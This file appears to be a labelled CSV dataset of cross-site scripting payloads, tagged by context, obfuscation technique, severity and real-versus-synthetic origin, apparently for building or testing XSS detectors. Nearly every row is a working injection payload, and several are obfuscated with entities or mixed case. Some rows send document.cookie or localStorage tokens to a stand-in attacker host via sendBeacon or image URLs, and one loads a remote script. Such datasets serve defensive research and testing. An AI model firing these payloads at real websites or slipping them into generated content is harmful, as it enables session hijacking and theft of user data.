payload,context,technique,severity,length,source
<xss	onmouseover=console.log('XSS')>,tag_injection,synthetic,medium,36,synthetic
"<style>@keyframes slidein {}</style><sub style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sub>",tag_injection,none,medium,160,real
<script onerror=alert(1) src=/></script>,script_injection,none,medium,40,real
' ><svg ondr&#97;g&#101;nt&#101;r=confirm('XSS')>,attribute_escape,synthetic,medium,49,synthetic
"onpointercancel=javascr	ipt:alert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,64,synthetic
<s&#101;t	on&#101;nd=&#97;l&#101;rt(1)>,tag_injection,synthetic,low,39,synthetic
	onclose=console.log('XSS'),event_handler,synthetic,medium,27,synthetic
"%3Cscript	%3Eprompt(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,high,63,synthetic
"<nobr onmousemove=""alert(1)"">AnonKryptiQuz</nobr>",tag_injection,none,medium,49,real
<%= &#97;l&#101;rt('XSS') %>,template_injection,synthetic,low,28,synthetic
"' ><svG oNtrAnsItiOnrUn=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
"\"" OndRagStaRt=ConFirM(1)//",attribute_escape,synthetic,medium,27,synthetic
%27 onhashchange=alert(%27XSS%27) %27,attribute_escape,synthetic,medium,37,synthetic
<&#97;nim&#97;t&#101;motion ong&#101;stur&#101;st&#97;rt=confirm(1)/>,tag_injection,synthetic,medium,69,synthetic
\' ontransitionend=prompt(location.hash)//,attribute_escape,synthetic,medium,42,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></article>",tag_injection,none,medium,184,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""print()""></del>",tag_injection,none,low,175,real
"<b draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</b>",tag_injection,none,medium,75,real
"(n&#101;w Function(""confirm(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""))();",dom_sink,synthetic,medium,134,synthetic
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></rp>",tag_injection,none,medium,97,real
\%27 onpaste=console.log(document.domain)//,attribute_escape,synthetic,medium,43,synthetic
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",dom_sink,none,low,97,real
%3Cmath ondragover=prompt(1)/%3E,tag_injection,synthetic,medium,32,synthetic
	onfocusin=confirm(document.domain),event_handler,synthetic,medium,35,synthetic
' oNtrAnsItiOneNd=AleRt(1) ',attribute_escape,synthetic,medium,28,synthetic
"\' OnmOusEenTer=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))//",attribute_escape,synthetic,high,60,synthetic
"<datalist oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</datalist>",tag_injection,none,medium,68,real
onload=alert/*x*/(document.domain),event_handler,synthetic,low,34,synthetic
location=%22javascript:console.log(localStorage.getItem(%27token%27))%22,dom_sink,synthetic,high,72,synthetic
' ><svG oNgeStuReeNd=ProMpt('XSS')>,attribute_escape,synthetic,medium,35,synthetic
<style onpointerout=alert(1) style=display:block>AnonKryptiQuz</style>,tag_injection,none,medium,70,real
"<main onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</main>",tag_injection,none,medium,61,real
"""><xmp onfocusout=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,56,synthetic
<img/src=`` onerror=this.onerror=confirm(1),tag_injection,none,medium,43,real
`%3E%3Cimg src=x onselect=confirm(location.hash)%3E,attribute_escape,synthetic,medium,51,synthetic
<area onpointerdown=alert(1) style=display:block>AnonKryptiQuz</area>,tag_injection,none,medium,69,real
onpointerup=prompt&#40;document.domain&#41;,event_handler,synthetic,low,43,synthetic
<!--><template onreset=\u0061lert(location.hash)>,tag_injection,synthetic,low,49,synthetic
"__proto__[""onmouseup""]=XMLHttpRequest(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink,synthetic,high,93,synthetic
java	script:confirm('XSS'),js_uri,synthetic,medium,26,synthetic
<&#101;mb&#101;d onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,low,102,synthetic
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",js_uri,case_variation,medium,81,real
<body oninvalid=\u0061lert(location.hash)/>,tag_injection,synthetic,low,43,synthetic
<dir onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</dir><input value=clickme>,tag_injection,none,medium,97,real
""" ><svG oNmoUseOveR=pRomPt(DocUmeNt.DomAin)>",attribute_escape,synthetic,medium,44,synthetic
"<nav onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",tag_injection,none,medium,67,real
"<rtc onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rtc>",tag_injection,none,medium,81,real
"""><MatH oNscRolLenD=pRomPt(DocUmeNt.DomAin)>",tag_injection,synthetic,medium,44,synthetic
<svg><option onload=alert(1)></option>,tag_injection,none,medium,38,real
"document.write(""<img src=x onerror=confirm('//attacker.com/?c='+document.cookie)>"")",dom_sink,synthetic,high,83,synthetic
"' ><svg onvolumechange=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
%27 ><svg onpopstate=alert(1)>,attribute_escape,synthetic,medium,30,synthetic
%3Cset/onwebkitfullscreenchange=console.log('XSS')%3E,tag_injection,synthetic,medium,53,synthetic
<svg><bgsound onload=alert(1)></bgsound>,tag_injection,none,medium,40,real
'><img src=x onch&#97;ng&#101;=consol&#101;.log(1)>,attribute_escape,synthetic,low,51,synthetic
"?callback=javascript:alert(1)"",",js_uri,none,medium,31,real
"<plaintext onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</plaintext>",tag_injection,none,medium,79,real
&quot; onfullscreenchange=\u0061lert(location.hash) x=&quot;,attribute_escape,synthetic,low,60,synthetic
<!--><iframe onsecuritypolicyviolation=confirm('XSS')>,tag_injection,synthetic,medium,54,synthetic
<&#97; onk&#101;ypr&#101;ss=confirm(1)>,tag_injection,synthetic,medium,39,synthetic
&quOt; onCanPlaY=cOnfIrm(loCatIon.haSh) x=&quOt;,attribute_escape,synthetic,medium,48,synthetic
	onmouseup=console.log('XSS'),event_handler,synthetic,medium,29,synthetic
<th onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</th><input value=clickme>,tag_injection,none,medium,104,real
"<sVg OnPointerEnter=""location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div"">",dom_sink,case_variation,high,77,real
"	ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,62,synthetic
"__proto__[""onp&#97;g&#101;sw&#97;p""]=&#101;v&#97;l(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,151,synthetic
"<script>s&#101;tTim&#101;out('prompt(String.fromCh&#97;rCod&#101;(88,83,83))',0)</script>",script_injection,synthetic,medium,89,synthetic
"<applet onmousemove=""alert(1)"">AnonKryptiQuz</applet>",tag_injection,none,medium,53,real
"<style>:target {transform: rotate(180deg);}</style><plaintext id=x style=""transition:transform 2s"" ontransitionrun=print()></plaintext>",tag_injection,none,low,135,real
\' OnkEypResS=aLerT(1)//,attribute_escape,synthetic,medium,24,synthetic
"location=%22javascript:fetch(String.fromCharCode(88,83,83))%22",dom_sink,synthetic,high,62,synthetic
"`><img src=x ontouchend=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,62,synthetic
"<div draggable=""true"" contenteditable>drag me</div><image3 ondragover=alert(1) contenteditable style=display:block>drop here</image3>",tag_injection,none,medium,133,real
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>",tag_injection,none,medium,117,real
""" ><svg on&#97;nim&#97;tion&#101;nd=consol&#101;.log('XSS')>",attribute_escape,synthetic,low,60,synthetic
"<style>:target {transform: rotate(180deg);}</style><button id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></button>",tag_injection,none,medium,130,real
onpopst&#97;t&#101;=confirm(1),event_handler,synthetic,medium,30,synthetic
"<ul onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</ul>",tag_injection,none,medium,80,real
<scRipT>FUncTioN('ProMpt(1)')();</scRipT>,script_injection,synthetic,medium,41,synthetic
"<IMG SRC=# onmouseover=""alert('xxs')"">",tag_injection,case_variation,medium,38,real
%3Cembed%20src%3D%60javascript%3Aalert%28%60AnonKryptiQuz%60%29%60%3E,generic,url_encoding,low,69,real
"__proto__[""onpoint&#101;rov&#101;r""]=confirm(docum&#101;nt.dom&#97;in)",dom_sink,synthetic,medium,70,synthetic
"<style>:target {color:red;}</style><h1 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></h1>",tag_injection,none,medium,108,real
	onscrollsnapchange=confirm('XSS'),event_handler,synthetic,medium,34,synthetic
onpointerrawupdate=console.log&#40;location.hash&#41;,event_handler,synthetic,low,53,synthetic
"<style>:target {color:red;}</style><blockquote id=x style=""transition:color 1s"" ontransitionstart=alert(1)></blockquote>",tag_injection,none,medium,120,real
"<div	onp&#97;us&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,69,synthetic
%3Cmtext onmousedown=console.log(1) onmousedown=console.log(1)%3E,tag_injection,synthetic,medium,65,synthetic
'><img src=x ontransitionend=\u0061lert(document.domain)>,attribute_escape,synthetic,low,57,synthetic
{% prompt document.cookie %},template_injection,synthetic,high,28,synthetic
<button popovertarget=x>Click me</button><div onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</div>,tag_injection,none,medium,102,real
"""><img src=x onkeypress=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
<scRipT	>ProMpt('XSS')</ScrIpt>,script_injection,synthetic,medium,31,synthetic
"<frame onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,85,real
"""><Img srC=x onPagEhiDe=ProMpt(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,48,synthetic
"'><img src=x onended=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,63,synthetic
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(/AmoloHT/)""&#11;&#10;&#09;;>",generic,html_entity|whitespace_obfuscation,medium,84,real
{{ prompt(document.cookie) }},template_injection,synthetic,high,29,synthetic
&quOt; onSeaRch=prOmpT(lOcaTioN.hAsh) x=&qUot;,attribute_escape,synthetic,medium,46,synthetic
&quot; onselect=console.log(location.hash) x=&quot;,attribute_escape,synthetic,medium,51,synthetic
%27 ><svg onbeforetoggle=alert(location.hash)>,attribute_escape,synthetic,medium,46,synthetic
"%3Ctemplate onbegin=alert(String.fromCharCode(88,83,83))/%3E",tag_injection,synthetic,high,60,synthetic
<iframe2 onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,69,real
"%22 onload=alert(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,51,synthetic
"<video onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,71,real
"&quOt; onHasHchAngE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) x=&qUot;",attribute_escape,synthetic,high,67,synthetic
"__proto__[""onb&#101;for&#101;cut""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink,synthetic,high,117,synthetic
"OnpAgeRevEal=coNfiRm/*x*/(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,56,synthetic
"<audio2 onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</audio2>",tag_injection,none,medium,73,real
<script>javascript:alert(1)</script\x0A,script_injection,none,medium,39,real
<!--><t&#101;mpl&#97;t&#101; on&#101;nd&#101;d=prompt('XSS')>,tag_injection,synthetic,medium,61,synthetic
"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",tag_injection,none,medium,166,real
%3Canimate	onpageshow=console.log('XSS')%3E,tag_injection,synthetic,medium,43,synthetic
location=%22javascript:console.log(document.cookie+%27&loc=%27+location.href)%22,dom_sink,synthetic,high,80,synthetic
document.write(%22<img src=x onerror=alert(document.domain)>%22),dom_sink,synthetic,medium,64,synthetic
%3Cbase x=y onpointerup=alert(location.hash)%3E,tag_injection,synthetic,medium,47,synthetic
<script>window[%27prompt%27](%27XSS%27)</script>,script_injection,synthetic,low,48,synthetic
"""><svg onload=alert&amp;#x27;#x00000040""1"")>",tag_injection,none,low,44,real
"<figure draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",tag_injection,none,medium,90,real
"<menuitem onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</menuitem>",tag_injection,none,medium,77,real
%3Ctitle onstalled=alert('XSS')/%3E,tag_injection,synthetic,medium,35,synthetic
"<scr	ipt>setTimeout('confirm(1)',0)</scr	ipt>",script_injection,synthetic,medium,45,synthetic
"EvaL(""ConFirM(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)"")",dom_sink,synthetic,high,54,synthetic
onscrollsnapchange=javascript:alert(1),event_handler,synthetic,medium,38,synthetic
'><img src=x onpopstate=prompt(1)>,attribute_escape,synthetic,medium,34,synthetic
"""><tr onpointerrawupdate=alert(location.hash)>",tag_injection,synthetic,medium,46,synthetic
<iframe+/ON+onload=%20alert(/str0d/)>,tag_injection,url_encoding,medium,37,real
"\"" onpl&#97;y=confirm(docum&#101;nt.dom&#97;in)//",attribute_escape,synthetic,medium,49,synthetic
' ><svg ontouchst&#97;rt=confirm('XSS')>,attribute_escape,synthetic,medium,40,synthetic
"/</title/'/</style/</script/</textarea/--><p"" onclick=alert()//>*/alert()/*",tag_injection,none,medium,75,real
%3Cscript%3Ewindow['confirm'](location.hash)%3C/script%3E,script_injection,synthetic,low,57,synthetic
"<meter onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</meter>",tag_injection,none,medium,85,real
'%3E%3Cscript%3Econfirm(1)%3C/script%3E,script_injection,synthetic,medium,39,synthetic
<head onpointerenter=alert(1) style=display:block>AnonKryptiQuz</head>,tag_injection,none,medium,70,real
&lt;img/src=&quot;x&quot;/onerror=alert(23)&gt;,event_handler,none,medium,47,real
%27 onpointermove=confirm(document.domain) %27,attribute_escape,synthetic,medium,46,synthetic
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt&#40;1&#41;,event_handler,synthetic,low,66,synthetic
javascript:%0aconfirm(document.domain),js_uri,synthetic,medium,38,synthetic
<iframe2 onpointerdown=alert(1) style=display:block>AnonKryptiQuz</iframe2>,tag_injection,none,medium,75,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))>"")",dom_sink,synthetic,medium,118,synthetic
"<sup onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</sup>",tag_injection,none,medium,67,real
%27><img src=x oncontextmenu=alert(document.domain)>,attribute_escape,synthetic,medium,52,synthetic
<object onanimationcancel=alert(document.domain)>,tag_injection,synthetic,medium,49,synthetic
"<a onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</a>",tag_injection,none,medium,75,real
"<style>:target {color:red;}</style><img id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></img>",tag_injection,none,medium,110,real
"(neW FUncTioN(""ConFirM(lOcaLStOraGe.GetIteM('TokEn'))""))();",dom_sink,synthetic,high,59,synthetic
' ><svG oNclOse=alErt(doCumEnt.doMaiN)>,attribute_escape,synthetic,medium,39,synthetic
""" ><svG oNfoCus=alErt(1)>",attribute_escape,synthetic,medium,25,synthetic
"<figcaption draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",tag_injection,none,medium,98,real
<&#101;mb&#101;d onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,101,synthetic
<!--><a onmozfullscreenchange=\u0061lert(location.hash)>,tag_injection,synthetic,low,56,synthetic
'%3E%3Cimg src=x onwebkitfullscreenchange=console.log(document.domain)%3E,attribute_escape,synthetic,medium,73,synthetic
%3C!--%3E%3Cselect ongotpointercapture=confirm(document.domain)%3E,tag_injection,synthetic,medium,66,synthetic
%22><img src=x ondrop=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,40,synthetic
